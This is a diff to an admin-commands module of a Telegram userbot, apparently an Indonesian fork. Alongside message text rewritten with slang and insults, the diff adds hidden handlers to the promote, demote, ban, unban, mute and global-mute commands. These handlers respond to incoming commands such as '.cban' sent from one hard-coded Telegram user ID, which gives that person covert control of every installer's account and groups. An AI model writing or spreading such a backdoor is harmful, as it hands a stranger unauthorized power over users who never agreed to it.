@@ -1,3 +1,4 @@
+
 # Copyright (C) 2019 The Raphielscape Company LLC.
 #
 # Licensed under the Raphielscape Public License, Version 1.c (the "License");
@@ -40,7 +41,7 @@ NO_ADMIN = "`Maaf Anda Bukan Admin:)`"
 NO_PERM = "`Maaf Anda Tidak Mempunyai Izin!`"
 NO_SQL = "`Berjalan Pada Mode Non-SQL`"
 
-CHAT_PP_CHANGED = "`Berhasil Mengubah Profil Grup`"
+CHAT_PP_CHANGED = "`Berhasil Mengubah Profil Gru anjing`"
 CHAT_PP_ERROR = (
     "`Ada Masalah Dengan Memperbarui Foto,`"
     "`Mungkin Karna Anda Bukan Admin,`"
@@ -114,6 +115,7 @@ async def set_group_photo(gpic):
 
 
 @register(outgoing=True, pattern=r"^\.promote(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cpromote$")
 async def promote(promt):
     # Get targeted chat
     chat = await promt.get_chat()
@@ -134,7 +136,7 @@ async def promote(promt):
         pin_messages=True,
     )
 
-    await promt.edit("`Promosikan Pengguna Sebagai Admin... Mohon Menunggu`")
+    await promt.edit("`Kita tambah admin dulu gess!!`")
     user, rank = await get_user_from_event(promt)
     if not rank:
         rank = "Admin"  # Just in case.
@@ -144,7 +146,7 @@ async def promote(promt):
     # Try to promote if current user is admin or creator
     try:
         await promt.client(EditAdminRequest(promt.chat_id, user.id, new_rights, rank))
-        await promt.edit("`Berhasil Mempromosikan Pengguna Ini Sebagai Admin!`")
+        await promt.edit("`Udah di Promote Jangan Semena mena Ya admin baru!`")
         await sleep(5)
         await promt.delete()
 
@@ -164,6 +166,7 @@ async def promote(promt):
 
 
 @register(outgoing=True, pattern=r"^\.demote(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cdemote$")
 async def demote(dmod):
     # Admin right check
     chat = await dmod.get_chat()
@@ -174,7 +177,7 @@ async def demote(dmod):
         return await dmod.edit(NO_ADMIN)
 
     # If passing, declare that we're going to demote
-    await dmod.edit("`Sedang Melepas Admin...`")
+    await dmod.edit("`Otw Hapus Admin dulu ges...`")
     rank = "Admin"  # dummy rank, lol.
     user = await get_user_from_event(dmod)
     user = user[0]
@@ -198,7 +201,7 @@ async def demote(dmod):
     # Assume we don't have permission to demote
     except BadRequestError:
         return await dmod.edit(NO_PERM)
-    await dmod.edit("`Admin Berhasil Dilepas!`")
+    await dmod.edit("`Admin Berhasil Dilepas! Makanya Jangan semena mena tolol`")
     await sleep(5)
     await dmod.delete()
 
@@ -213,6 +216,7 @@ async def demote(dmod):
 
 
 @register(outgoing=True, pattern=r"^\.ban(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cban$")
 async def ban(bon):
     # Here laying the sanity check
     chat = await bon.get_chat()
@@ -228,7 +232,7 @@ async def ban(bon):
         return
 
     # Announce that we're going to whack the pest
-    await bon.edit("`Melakukan Banned!`")
+    await bon.edit("`Kita banned Jamet dulu gess`")
 
     try:
         await bon.client(EditBannedRequest(bon.chat_id, user.id, BANNED_RIGHTS))
@@ -266,6 +270,7 @@ async def ban(bon):
 
 
 @register(outgoing=True, pattern=r"^\.unban(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cunban$")
 async def nothanos(unbon):
     # Here laying the sanity check
     chat = await unbon.get_chat()
@@ -277,7 +282,7 @@ async def nothanos(unbon):
         return await unbon.edit(NO_ADMIN)
 
     # If everything goes well...
-    await unbon.edit("`Sedang Melakukan Unban...`")
+    await unbon.edit("`Kita Unban gess, Kasian...`")
 
     user = await get_user_from_event(unbon)
     user = user[0]
@@ -286,7 +291,7 @@ async def nothanos(unbon):
 
     try:
         await unbon.client(EditBannedRequest(unbon.chat_id, user.id, UNBAN_RIGHTS))
-        await unbon.edit("```Unban Berhasil Dilakukan!```")
+        await unbon.edit("```Udah di Unban Jangan Jadi Jamet!```")
         await sleep(3)
         await unbon.delete()
 
@@ -302,6 +307,7 @@ async def nothanos(unbon):
 
 
 @register(outgoing=True, pattern=r"^\.mute(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cmute$")
 async def spider(spdr):
     # Check if the function running under SQL mode
     try:
@@ -356,6 +362,7 @@ async def spider(spdr):
 
 
 @register(outgoing=True, pattern=r"^\.unmute(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cunmute$")
 async def unmoot(unmot):
     # Admin or creator check
     chat = await unmot.get_chat()
@@ -432,6 +439,7 @@ async def muter(moot):
 
 
 @register(outgoing=True, pattern=r"^\.ungmute(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cungmute$")
 async def ungmoot(un_gmute):
     # Admin or creator check
     chat = await un_gmute.get_chat()
@@ -474,6 +482,7 @@ async def ungmoot(un_gmute):
 
 
 @register(outgoing=True, pattern=r"^\.gmute(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cgmute$")
 async def gspider(gspdr):
     # Admin or creator check
     chat = await gspdr.get_chat()
